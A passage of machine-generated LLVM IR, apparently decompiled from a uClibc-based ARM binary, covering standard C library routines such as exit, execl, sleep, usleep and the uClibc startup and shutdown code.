  uselistorder label %dec_label_pc_15c0c, { 1, 0 }
  uselistorder label %dec_label_pc_15bf4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15b98, { 1, 0 }
  uselistorder label %dec_label_pc_15b94, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15b10, { 1, 0 }
  uselistorder label %dec_label_pc_15b0c, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_15c50 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_15c50, i32* @r0, align 4
  %v1_15c6c = call i32 @__pthread_return_void()
  %v1_15c7c = call i32 @__pthread_return_0()
  %v2_15c84 = load i32, i32* @global_var_32b40.1219, align 4
  %v2_15c88 = icmp eq i32 %v2_15c84, 0
  br i1 %v2_15c88, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_15c84)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_15c50, i32* @r0, align 4
  %v1_15ca8 = call i32 @__pthread_return_void()
  store i32 %v1_15ca8, i32* @r0, align 4
  %v1_15cac = call i32 @__GI___uClibc_fini(i32 %v1_15ca8)
  store i32 89280, i32* @lr, align 4
  %v2_15cbc = call i32 @_stdio_term()
  %v0_15cc0 = load i32, i32* @r4, align 4
  %v1_15cc4 = call i32 @__GI__exit(i32 %v0_15cc0)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 3, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_15ce4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_15ce4, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_15cf4 = ptrtoint i32* %stack_var_-32 to i32
  %v2_15cf8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_15cf8, i32* %stack_var_-32, align 4
  br label %dec_label_pc_15d04

dec_label_pc_15d04:                               ; preds = %dec_label_pc_15d04, %entry
  %v0_15d18 = phi i32 [ %v1_15d18, %dec_label_pc_15d04 ], [ 0, %entry ]
  %v3_15d04 = phi i32 [ %v1_15d0c, %dec_label_pc_15d04 ], [ %v2_15cf8, %entry ]
  %v1_15d08 = inttoptr i32 %v3_15d04 to i32*
  %v2_15d08 = load i32, i32* %v1_15d08, align 4
  %v1_15d0c = add i32 %v3_15d04, 4
  %v2_15d10 = icmp eq i32 %v2_15d08, 0
  store i32 %v1_15d0c, i32* %stack_var_-32, align 4
  %v1_15d18 = add i32 %v0_15d18, 1
  store i32 %v1_15d18, i32* @lr, align 4
  br i1 %v2_15d10, label %dec_label_pc_15d20, label %dec_label_pc_15d04

dec_label_pc_15d20:                               ; preds = %dec_label_pc_15d04
  %v3_15d20.neg = mul i32 %v1_15d18, -4
  %v1_15d24.neg = add i32 %v2_15cf4, -8
  %v2_15d28 = add i32 %v1_15d24.neg, %v3_15d20.neg
  %v2_15d30 = inttoptr i32 %v2_15d28 to i32*
  store i32 %arg1, i32* %v2_15d30, align 4
  store i32 %v2_15cf8, i32* %stack_var_-32, align 4
  %v0_15d3c = load i32, i32* @sp, align 4
  store i32 %v0_15d3c, i32* @r1, align 4
  store i32 %v0_15d3c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15d44

dec_label_pc_15d44:                               ; preds = %dec_label_pc_15d44.dec_label_pc_15d44_crit_edge, %dec_label_pc_15d20
  %v1_15d58 = phi i32 [ %v5_15d58, %dec_label_pc_15d44.dec_label_pc_15d44_crit_edge ], [ %v0_15d3c, %dec_label_pc_15d20 ]
  %v3_15d44 = phi i32 [ %v3_15d44.pre, %dec_label_pc_15d44.dec_label_pc_15d44_crit_edge ], [ %v2_15cf8, %dec_label_pc_15d20 ]
  %v1_15d48 = inttoptr i32 %v3_15d44 to i32*
  %v2_15d48 = load i32, i32* %v1_15d48, align 4
  %v0_15d4c = load i32, i32* @lr, align 4
  %v1_15d4c = add i32 %v0_15d4c, -1
  store i32 %v1_15d4c, i32* @lr, align 4
  %v7_15d4c = icmp eq i32 %v0_15d4c, 1
  %v1_15d50 = add i32 %v3_15d44, 4
  store i32 %v1_15d50, i32* %stack_var_-32, align 4
  %v2_15d58 = add i32 %v1_15d58, 4
  %v3_15d58 = inttoptr i32 %v2_15d58 to i32*
  store i32 %v2_15d48, i32* %v3_15d58, align 4
  %v4_15d58 = load i32, i32* %ip.global-to-local, align 4
  %v5_15d58 = add i32 %v4_15d58, 4
  store i32 %v5_15d58, i32* %ip.global-to-local, align 4
  br i1 %v7_15d4c, label %dec_label_pc_15d60, label %dec_label_pc_15d44.dec_label_pc_15d44_crit_edge

dec_label_pc_15d44.dec_label_pc_15d44_crit_edge:  ; preds = %dec_label_pc_15d44
  %v3_15d44.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_15d44

dec_label_pc_15d60:                               ; preds = %dec_label_pc_15d44
  %v2_15d64 = load i32, i32* @global_var_32b48.1224, align 4
  store i32 %v2_15d64, i32* @r2, align 4
  %v0_15d68 = call i32 @__GI_execve()
  ret i32 %v0_15d68

; uselistorder directives
  uselistorder i32 %v5_15d58, { 1, 0 }
  uselistorder i32 %v0_15d4c, { 1, 0 }
  uselistorder i32 %v1_15d18, { 0, 2, 1 }
  uselistorder i32 %v1_15d0c, { 1, 0 }
  uselistorder i32 %v3_15d04, { 1, 0 }
  uselistorder i32 %v2_15cf8, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_15d78 = load i32, i32* @r4, align 4
  store i32 %v3_15d78, i32* %stack_var_-20, align 4
  %v6_15d78 = load i32, i32* @r5, align 4
  %v9_15d78 = load i32, i32* @r6, align 4
  %v16_15d78 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_15d7c = icmp eq i32 %arg1, 0
  %v2_15d80 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_15d7c, label %dec_label_pc_15f04, label %dec_label_pc_15d98.preheader

dec_label_pc_15d98.preheader:                     ; preds = %entry
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_15da017 = add i32 %v16_15d78, 124
  br label %dec_label_pc_15d90

dec_label_pc_15d90:                               ; preds = %dec_label_pc_15d98.preheader, %dec_label_pc_15d90
  %v5_15da018 = phi i32 [ %v5_15da017, %dec_label_pc_15d98.preheader ], [ %v5_15da0, %dec_label_pc_15d90 ]
  %v2_15d94 = add i32 %v5_15da018, -136
  %v3_15d94 = inttoptr i32 %v2_15d94 to i32*
  store i32 0, i32* %v3_15d94, align 4
  %v0_15d98.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15d98 = add i32 %v0_15d98.pre, -1
  store i32 %v1_15d98, i32* %r1.global-to-local, align 4
  %v6_15d98 = icmp slt i32 %v1_15d98, 0
  %v4_15da0 = mul i32 %v1_15d98, 4
  %v5_15da0 = add i32 %v4_15da0, %v16_15d78
  br i1 %v6_15d98, label %dec_label_pc_15da8, label %dec_label_pc_15d90

dec_label_pc_15da8:                               ; preds = %dec_label_pc_15d90
  %v2_15da8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_15da8, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_15db8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_15db8, i32* %stack_var_-28, align 4
  %v0_15dc0 = call i32 @__sigaddset()
  store i32 %v0_15dc0, i32* %r0.global-to-local, align 4
  %v1_15dc4 = load i32, i32* @r5, align 4
  %v5_15dc8 = icmp slt i32 %v0_15dc0, %v1_15dc4
  br i1 %v5_15dc8, label %dec_label_pc_15f0c, label %dec_label_pc_15dcc

dec_label_pc_15dcc:                               ; preds = %dec_label_pc_15da8
  %v2_15dcc = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_15dcc, i32* @r4, align 4
  store i32 %v1_15dc4, i32* %r0.global-to-local, align 4
  store i32 %v2_15da8, i32* %r1.global-to-local, align 4
  %v3_15ddc = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_15ddc = call i32 @__GI_sigprocmask(i32 %v1_15dc4, %_TYPEDEF_sigset_t* %v3_15ddc, i32 %v2_15dcc)
  store i32 %v4_15ddc, i32* %r0.global-to-local, align 4
  %v1_15de0 = load i32, i32* @r5, align 4
  %v9_15de0 = icmp eq i32 %v4_15ddc, %v1_15de0
  br i1 %v9_15de0, label %dec_label_pc_15de8, label %dec_label_pc_15f0c

dec_label_pc_15de8:                               ; preds = %dec_label_pc_15dcc
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_15dcc, i32* %r0.global-to-local, align 4
  %v2_15df0 = call i32 @__sigismember(i32 %v2_15dcc, i32 17)
  store i32 %v2_15df0, i32* %r0.global-to-local, align 4
  %v1_15df4 = load i32, i32* @r5, align 4
  %v9_15df4 = icmp eq i32 %v2_15df0, %v1_15df4
  br i1 %v9_15df4, label %dec_label_pc_15e0c.preheader, label %dec_label_pc_15de8.dec_label_pc_15ed4_crit_edge

dec_label_pc_15de8.dec_label_pc_15ed4_crit_edge:  ; preds = %dec_label_pc_15de8
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_15ed4

dec_label_pc_15e0c.preheader:                     ; preds = %dec_label_pc_15de8
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15e04

dec_label_pc_15e04:                               ; preds = %dec_label_pc_15e0c.preheader, %dec_label_pc_15e04
  %v5_15e1416 = phi i32 [ %v5_15da017, %dec_label_pc_15e0c.preheader ], [ %v5_15e14, %dec_label_pc_15e04 ]
  %v2_15e08 = add i32 %v5_15e1416, -136
  %v3_15e08 = inttoptr i32 %v2_15e08 to i32*
  store i32 0, i32* %v3_15e08, align 4
  %v0_15e0c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15e0c = add i32 %v0_15e0c.pre, -1
  store i32 %v1_15e0c, i32* %r1.global-to-local, align 4
  %v6_15e0c = icmp slt i32 %v1_15e0c, 0
  %v4_15e14 = mul i32 %v1_15e0c, 4
  %v5_15e14 = add i32 %v4_15e14, %v16_15d78
  br i1 %v6_15e0c, label %dec_label_pc_15e1c, label %dec_label_pc_15e04

dec_label_pc_15e1c:                               ; preds = %dec_label_pc_15e04
  store i32 %v2_15da8, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_15e24 = call i32 @__sigaddset()
  store i32 %v0_15e24, i32* %r0.global-to-local, align 4
  %v1_15e28 = icmp slt i32 %v0_15e24, 0
  br i1 %v1_15e28, label %dec_label_pc_15f0c, label %dec_label_pc_15e30

dec_label_pc_15e30:                               ; preds = %dec_label_pc_15e1c
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_15e3c = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_15d80)
  store i32 %v4_15e3c, i32* %r0.global-to-local, align 4
  %v1_15e40 = icmp slt i32 %v4_15e3c, 0
  br i1 %v1_15e40, label %dec_label_pc_15e48, label %dec_label_pc_15e70

dec_label_pc_15e48:                               ; preds = %dec_label_pc_15e30
  %v0_15e48 = call i32 @__errno_location()
  store i32 %v2_15dcc, i32* %r1.global-to-local, align 4
  store i32 %v0_15e48, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_15e5c = inttoptr i32 %v0_15e48 to i32*
  %v2_15e5c = load i32, i32* %v1_15e5c, align 4
  store i32 %v2_15e5c, i32* @r4, align 4
  %v3_15e60 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_15e60 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_15e60, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_15e68 = load i32, i32* @r4, align 4
  %v1_15e68 = load i32, i32* %r5.global-to-local, align 4
  %v2_15e68 = inttoptr i32 %v1_15e68 to i32*
  store i32 %v0_15e68, i32* %v2_15e68, align 4
  %v17_15f14.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15f10

dec_label_pc_15e70:                               ; preds = %dec_label_pc_15e30
  %v2_15e70 = load i32, i32* %stack_var_-424, align 4
  %v7_15e74 = icmp eq i32 %v2_15e70, 1
  %v2_15e7c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_15e7c, i32* @r4, align 4
  br i1 %v7_15e74, label %dec_label_pc_15e84, label %dec_label_pc_15eb8

dec_label_pc_15e84:                               ; preds = %dec_label_pc_15e70
  store i32 %v2_15e7c, i32* %r1.global-to-local, align 4
  store i32 %v2_15e7c, i32* %r0.global-to-local, align 4
  %v2_15e8c = bitcast i32* %stack_var_-28 to %timespec*
  %v3_15e8c = call i32 @__libc_nanosleep(%timespec* %v2_15e8c, i32 %v2_15e7c)
  store i32 %v3_15e8c, i32* %r0.global-to-local, align 4
  store i32 %v3_15e8c, i32* %r6.global-to-local, align 4
  %v0_15e94 = call i32 @__errno_location()
  store i32 %v2_15dcc, i32* %r1.global-to-local, align 4
  store i32 %v0_15e94, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_15ea8 = inttoptr i32 %v0_15e94 to i32*
  %v2_15ea8 = load i32, i32* %v1_15ea8, align 4
  store i32 %v2_15ea8, i32* @r4, align 4
  %v3_15eac = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_15eac = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_15eac, i32 0)
  store i32 %v4_15eac, i32* %r0.global-to-local, align 4
  %v0_15eb0 = load i32, i32* @r4, align 4
  %v1_15eb0 = load i32, i32* %r5.global-to-local, align 4
  %v2_15eb0 = inttoptr i32 %v1_15eb0 to i32*
  store i32 %v0_15eb0, i32* %v2_15eb0, align 4
  %v0_15ee0.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15ee0

dec_label_pc_15eb8:                               ; preds = %dec_label_pc_15e70
  store i32 %v2_15dcc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_15ec4 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_15ec4 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_15ec4, i32 0)
  store i32 %v4_15ec4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15ed4

dec_label_pc_15ed4:                               ; preds = %dec_label_pc_15de8.dec_label_pc_15ed4_crit_edge, %dec_label_pc_15eb8
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_15de8.dec_label_pc_15ed4_crit_edge ], [ %v2_15e7c, %dec_label_pc_15eb8 ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_15ed8 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_15ed8 = call i32 @__libc_nanosleep(%timespec* %v2_15ed8, i32 %storemerge.pre-phi)
  store i32 %v3_15ed8, i32* %r0.global-to-local, align 4
  store i32 %v3_15ed8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15ee0

dec_label_pc_15ee0:                               ; preds = %dec_label_pc_15e84, %dec_label_pc_15ed4
  %v0_15ee0 = phi i32 [ %v0_15ee0.pr, %dec_label_pc_15e84 ], [ %v3_15ed8, %dec_label_pc_15ed4 ]
  %v2_15ee0 = icmp eq i32 %v0_15ee0, 0
  br i1 %v2_15ee0, label %dec_label_pc_15f04, label %dec_label_pc_15ee8

dec_label_pc_15ee8:                               ; preds = %dec_label_pc_15ee0
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_15ef0 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_15ef0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15f10

dec_label_pc_15f04:                               ; preds = %entry, %dec_label_pc_15ee0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15f10

dec_label_pc_15f0c:                               ; preds = %dec_label_pc_15dcc, %dec_label_pc_15e1c, %dec_label_pc_15da8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15f10

dec_label_pc_15f10:                               ; preds = %dec_label_pc_15ee8, %dec_label_pc_15f04, %dec_label_pc_15e48, %dec_label_pc_15f0c
  %v17_15f14 = phi i32 [ %v3_15ef0, %dec_label_pc_15ee8 ], [ 0, %dec_label_pc_15f04 ], [ %v17_15f14.pre, %dec_label_pc_15e48 ], [ -1, %dec_label_pc_15f0c ]
  %v2_15f14 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15f14, i32* @r4, align 4
  store i32 %v6_15d78, i32* @r5, align 4
  store i32 %v9_15d78, i32* @r6, align 4
  ret i32 %v17_15f14

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_15e7c, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_15e0c, { 0, 2, 1 }
  uselistorder i32 %v2_15dcc, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_15dc4, { 1, 0, 2 }
  uselistorder i32 %v1_15d98, { 0, 2, 1 }
  uselistorder i32 %v16_15d78, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 8, 9, 10, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 7, 6, 9, 8, 11, 10, 13, 14, 12, 16, 15, 17, 19, 18, 21, 20, 22, 0 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 ()* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 -136, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_15f10, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_15f0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15f04, { 1, 0 }
  uselistorder label %dec_label_pc_15ee0, { 1, 0 }
  uselistorder label %dec_label_pc_15ed4, { 1, 0 }
  uselistorder label %dec_label_pc_15e04, { 1, 0 }
  uselistorder label %dec_label_pc_15d90, { 1, 0 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_15f1c = load i32, i32* @r4, align 4
  store i32 1000000, i32* @r4, align 4
  %v2_15f30 = udiv i32 %arg1, 1000000
  store i32 %v2_15f30, i32* %stack_var_-20, align 4
  %v2_15f58 = bitcast i32* %stack_var_-20 to %timespec*
  %v3_15f58 = call i32 @__libc_nanosleep(%timespec* %v2_15f58, i32 0)
  store i32 %v3_15f1c, i32* @r4, align 4
  ret i32 %v3_15f58

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_15f94:
  %stack_var_-8 = alloca i32, align 4
  %v3_15f68 = load i32, i32* @r4, align 4
  store i32 %v3_15f68, i32* %stack_var_-8, align 4
  %v2_15f98 = load i32, i32* @global_var_32b50.1231, align 4
  %v2_15f9c = icmp eq i32 %v2_15f98, 0
  br i1 %v2_15f9c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_15f94
  call void @__pseudo_branch(i32 %v2_15f98)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15f94, %bb
  %v2_15fac = load i32, i32* @global_var_32b54.1233, align 4
  %v2_15fb0 = icmp eq i32 %v2_15fac, 0
  br i1 %v2_15fb0, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_15fb4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_15fb4, i32* @r4, align 4
  %v9_15fb4 = load i32, i32* @r0, align 4
  ret i32 %v9_15fb4

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_15fac)
  %v2_15fc0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15fc0, i32* @r4, align 4
  %v8_15fc0 = load i32, i32* @r0, align 4
  ret i32 %v8_15fc0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v1_15fdc = load i32, i32* @r0, align 4
  ret i32 %v1_15fdc
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15fe0 = load i32, i32* @r4, align 4
  store i32 %v3_15fe0, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_15ff0 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_15ff4 = icmp eq i32 %v2_15ff0, -1
  br i1 %v7_15ff4, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_15ff8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_15ff8, i32* @r4, align 4
  ret i32 %v2_15ff0

bb4:                                              ; preds = %entry
  %v0_15ffc = load i32, i32* @r4, align 4
  %v4_16004 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_23efc.1236, i32 0, i32 0), i32 %v0_15ffc)
  %v1_16008 = load i32, i32* %r5.global-to-local, align 4
  %v9_16008 = icmp eq i32 %v4_16004, %v1_16008
  br i1 %v9_16008, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_1600c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_1600c, i32* @r4, align 4
  ret i32 %v4_16004

bb6:                                              ; preds = %bb4
  %v0_16010 = call i32 @abort()
  %v0_16014 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16014, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  %v1_16014 = load i32, i32* @r3, align 4
  %v3_16014 = load i32, i32* @r2, align 4
  %v4_16014 = inttoptr i32 %v3_16014 to i32*
  store i32 %v1_16014, i32* %v4_16014, align 4
  %v5_16014 = load i32, i32* @ip, align 4
  %v6_16014 = load i32, i32* @r2, align 4
  %v7_16014 = sub i32 %v6_16014, %v5_16014
  store i32 %v7_16014, i32* @r2, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_16010

; uselistorder directives
  uselistorder i32 %v2_15ff0, { 1, 0 }
  uselistorder i32 ()* @abort, { 0, 2, 1, 3 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 5, 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1601c = load i32, i32* @global_var_32b58.1238, align 4
  %v2_16020 = icmp eq i32 %v2_1601c, 0
  br i1 %v2_16020, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v6_1602c = load i32, i32* @r0, align 4
  ret i32 %v6_1602c

bb3:                                              ; preds = %entry
  store i32 1, i32* @global_var_32b58.1238, align 4
  store i32 4096, i32* @global_var_32b4c.985, align 4
  %v0_16060 = call i32 @_stdio_init()
  ret i32 %v0_16060
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_16078 = mul i32 %arg2, 4
  %v5_16078 = add i32 %tmp, %v4_16078
  %v2_1607c = load i32, i32* %arg3, align 4
  %v2_16080 = ptrtoint i32* %stack_var_-120 to i32
  %v1_16084 = add i32 %v5_16078, 4
  %v9_16088 = icmp eq i32 %v1_16084, %v2_1607c
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_32b44.1244, align 4
  store i32 %v1_16084, i32* @global_var_32b48.1224, align 4
  store i32 %arg6, i32* @global_var_32b54.1233, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_16088, label %bb, label %bb41

bb:                                               ; preds = %entry
  store i32 %v5_16078, i32* @global_var_32b48.1224, align 4
  br label %bb41

bb41:                                             ; preds = %entry, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_160c8 = bitcast i32* %stack_var_-120 to i8*
  %v3_160c8 = call i32 @__GI_memset(i8* %v2_160c8, i32 0)
  %storemerge.pre = load i32, i32* @global_var_32b48.1224, align 4
  br label %dec_label_pc_160d8

dec_label_pc_160d8:                               ; preds = %dec_label_pc_160d8, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_160d8, %dec_label_pc_160d8 ]
  %v1_160d8 = inttoptr i32 %storemerge to i32*
  %v2_160d8 = load i32, i32* %v1_160d8, align 4
  %v4_160d8 = add i32 %storemerge, 4
  %v2_160dc = icmp eq i32 %v2_160d8, 0
  br i1 %v2_160dc, label %dec_label_pc_160e8, label %dec_label_pc_160d8

dec_label_pc_160e8:                               ; preds = %dec_label_pc_160d8
  store i32 %v4_160d8, i32* @r4, align 4
  %v1_1610822 = inttoptr i32 %v4_160d8 to i32*
  %v2_1610823 = load i32, i32* %v1_1610822, align 4
  %v2_1610c25 = icmp eq i32 %v2_1610823, 0
  br i1 %v2_1610c25, label %dec_label_pc_16114, label %dec_label_pc_160f0

dec_label_pc_160f0:                               ; preds = %dec_label_pc_160e8, %dec_label_pc_16108
  %v5_160f4 = phi i32 [ %v2_16108, %dec_label_pc_16108 ], [ %v2_1610823, %dec_label_pc_160e8 ]
  %v2_160f0 = icmp ugt i32 %v5_160f4, 13
  %v7_160f0 = icmp eq i32 %v5_160f4, 14
  %v2_160f4 = xor i1 %v2_160f0, true
  %v3_160f4 = or i1 %v7_160f0, %v2_160f4
  br i1 %v3_160f4, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_160f0
  %v6_160f4 = and i32 %v5_160f4, 536870912
  %v7_160f4 = icmp ne i32 %v6_160f4, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_160f0, %bb42
  %v1_16100 = phi i1 [ %v2_160f0, %dec_label_pc_160f0 ], [ %v7_160f4, %bb42 ]
  %v2_160f8 = xor i1 %v1_16100, true
  %v3_160f8 = or i1 %v7_160f0, %v2_160f8
  br i1 %v3_160f8, label %bb44, label %dec_label_pc_16108

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_16108

dec_label_pc_16108:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_160f8, i32 ptrtoint ([3 x i8]* @global_var_13e10.1247 to i32))
  %v0_16104 = load i32, i32* @r4, align 4
  %v1_16104 = add i32 %v0_16104, 8
  store i32 %v1_16104, i32* @r4, align 4
  %v1_16108 = inttoptr i32 %v1_16104 to i32*
  %v2_16108 = load i32, i32* %v1_16108, align 4
  %v2_1610c = icmp eq i32 %v2_16108, 0
  br i1 %v2_1610c, label %dec_label_pc_16114, label %dec_label_pc_160f0

dec_label_pc_16114:                               ; preds = %dec_label_pc_16108, %dec_label_pc_160e8
  %v1_16118 = call i32 @_dl_aux_init(i32 %v2_16080)
  store i32 %v1_16118, i32* @r0, align 4
  %v1_1611c = call i32 @__GI___uClibc_init(i32 %v1_16118)
  store i32 %v1_1611c, i32* @r0, align 4
  %v2_16128 = icmp eq i32 %tmp37, 0
  br i1 %v2_16128, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_16114
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_16114, %bb45
  %v0_16138 = phi i32 [ %tmp37, %dec_label_pc_16114 ], [ 4096, %bb45 ]
  %v3_16130 = icmp eq i32 %tmp36, -1
  %v8_16130 = icmp eq i32 %tmp36, -1
